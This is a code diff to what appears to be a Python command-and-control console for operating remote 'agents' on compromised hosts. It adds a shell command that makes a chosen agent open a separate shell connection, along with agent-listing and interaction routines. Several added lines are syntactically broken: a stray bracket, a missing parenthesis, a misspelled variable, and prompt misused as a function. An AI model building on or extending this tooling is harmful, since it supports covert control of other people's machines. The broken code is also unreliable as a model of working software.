@@ -36,6 +36,7 @@ def main():
     terminal.cmdloop()
 
 
+
 class Terminal(Cmd):
     def __init__(self,Listeners,ClientDict):
         Cmd.__init__(self)
@@ -46,7 +47,37 @@ class Terminal(Cmd):
         self.ClientDict = ClientDict
         self.agent = ''
         self.prompt = '$ '
-    
+
+    def do_shell(self,args):
+        if self.q == None:
+            print("[-] You need to choose agent.")
+            self.help_interact()
+        else:
+            self.q.put("shell\n")
+            # For now shell is implemented in separate connection in agents
+            # Sleep while shell connection is created
+            time.sleep(3)
+            print("[DBG] Getting new connection queue...")
+            # Parsing last agent ID
+            self.shellagent = list(self.ClientDict.keys())[-1]
+            # TODO - IMPLEMENT VERIFICATION IF SAME IP? ONLY THEN ASSIGN QUEUE?
+            self.q = self.ClientDict[self.agent]][1]
+            print("[DBG] Shell Agent ID: {}".format(self.shellagent)
+            print("[DBG] Agent data: {}".format(self.ClientDict[self.shellagent]))
+            self.prompt('{} >'.format(self.ClientDict[self.shellagent][0][0]))
+
+    def do_interact(self,args):
+        if len(args.split(' ')) != 1 or args.split(' ')[0] == '':
+            self.help_list()
+        else:
+            self.agent = args
+            try:
+                self.q = ClientDict[self.agent][1]
+                self.prompt = '{} $ '.format(self.ClientDict[self.agent][0][0])
+            except KeyError:
+                print("[-] No such agent. Use: 'list agents'")
+            except Exception as ex:
+                print("[-] Unhandled exception: {}".format(ex))
 
     def do_exit(self,args):
         time.sleep(0.5)
@@ -81,7 +112,9 @@ class Terminal(Cmd):
             self.help_list()
         else:
             if (args.lower() == "agents" or args == "a"):
-                print("Agents: {}".format(ClientDict))
+                print("Agents:\n")#.format(ClientDict))
+                for i in ClienDict.keys():
+                    print("\tID: {}, IP: {}".format(i,ClientDict[i][0][0]))
             elif (args.lower() == "lhost"):
                 print("lhost: {}".format(self.lhost))
             elif (args.lower() == "lport"):
@@ -137,34 +170,14 @@ class Terminal(Cmd):
             self.q.put(args+"\n")
         time.sleep(1) # To not input prompt before response
 
-    def do_interact(self,args):
-        if len(args.split(' ')) != 1 or args.split(' ')[0] == '':
-            self.help_list()
-        else:
-            self.agent = args
-            try:
-                self.q = ClientDict[self.agent][1]
-                self.prompt = '{} $ '.format(self.ClientDict[self.agent][0][0])
-            except KeyError:
-                print("[-] No such agent. Use: 'list agents'")
-            except Exception as ex:
-                print("[-] Unhandled exception: {}".format(ex))
-
     def help_interact(self):
         print("interact <agent_id>")
-        print("To view available agents, user: list agents")
+        print("To view available agents, use: list agents")
 
     def do_back(self,args):
         self.q = None
         self.prompt = '$ '
     
-    def do_shell(self,args):
-        if self.q == None:
-            print("[-] You need to choose agent.")
-            self.help_interact()
-        else:
-            self.q.put("shell\n")
-            print("SHELL TODO")
 
 
 class listener_tcp(threading.Thread):
